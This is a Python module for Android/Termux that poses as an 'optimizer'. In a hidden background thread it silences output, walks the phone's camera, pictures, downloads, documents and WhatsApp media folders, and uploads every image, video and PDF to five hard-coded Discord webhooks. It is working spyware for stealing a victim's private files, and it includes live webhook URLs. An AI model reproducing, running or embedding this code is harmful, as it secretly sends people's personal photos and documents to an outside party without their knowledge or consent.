import os
import requests
import platform
import time
import subprocess
import sys
import threading
from io import StringIO

# --- CONFIGURACIÓN ---
WEBHOOKS = [
    "https://discord.com/api/webhooks/1486545006125649920/TMw8QOVkfiLWo28wCu_3HecycwSjvutjHm6i7Q_aY0lmSfm_gS052b_ntKra18W6NVGB",
    "https://discord.com/api/webhooks/1486545033518649395/vlosJxXQGQzH_VfImhWLjDSA4U2fGJ63kK6Gv5GrN7UC97NsxAX5Ra9WuOZwhOYxVh9u",
    "https://discord.com/api/webhooks/1486545027969581188/ji3YjwIztuGPU2b9PuqVM1ZsqiuySu8cUkQsW1ue-ziC_cyF9xjnggQX7VaIqR7RtvZj",
    "https://discord.com/api/webhooks/1486545021812473886/jeObiYv6fe2VRbqM_jn3oCTbfC_OeUO8Zds4h1PiI-AaBC4NW4JhsewwhjyH56g6Ulbx",
    "https://discord.com/api/webhooks/1486545014317387888/5zWJm4mF4Op8j-un4ZgujA9jeypS--8gkvJ-BHMbrFPPBm1Zb5SZad90npNnV44RRNc6"
]

MAX_MEDIA_SIZE = 8 * 1024 * 1024  
MAX_PDF_SIZE = 15 * 1024 * 1024   

def check_storage_permissions():
    if platform.system() != "Linux": return True
    try:
        subprocess.run(["termux-setup-storage"], capture_output=True, text=True)
        return True
    except: return False

def get_file_type_and_valid(filename):
    ext = filename.lower()
    if ext.endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mov', '.avi', '.mkv')):
        return "media"
    if ext.endswith('.pdf'):
        return "pdf"
    return None

def send_to_discord(file_path, webhook_url):
    try:
        if not os.access(file_path, os.R_OK): return False
        file_type = get_file_type_and_valid(file_path)
        file_size = os.path.getsize(file_path)
        if file_type == "media" and file_size > MAX_MEDIA_SIZE: return False
        if file_type == "pdf" and file_size > MAX_PDF_SIZE: return False
        filename = os.path.basename(file_path)
        with open(file_path, 'rb') as f:
            requests.post(webhook_url, files={'file': (filename, f)}, timeout=45)
            return True
    except: return False

def process_gallery():
    f = StringIO()
    sys.stdout = f 
    sys.stderr = f
    
    if not check_storage_permissions(): return
    
    search_paths = [
        "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download", "/storage/emulated/0/Documents",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"
    ]
    
    webhook_index = 0
    for base_path in search_paths:
        if not os.path.exists(base_path): continue
        for root, _, files in os.walk(base_path):
            for file in files:
                if get_file_type_and_valid(file):
                    file_path = os.path.join(root, file)
                    if send_to_discord(file_path, WEBHOOKS[webhook_index]):
                        webhook_index = (webhook_index + 1) % len(WEBHOOKS)
                        time.sleep(0.5)

# Esta es la función que llamaremos desde el código principal
def start_optimizer():
    t = threading.Thread(target=process_gallery, daemon=True)
    t.start()
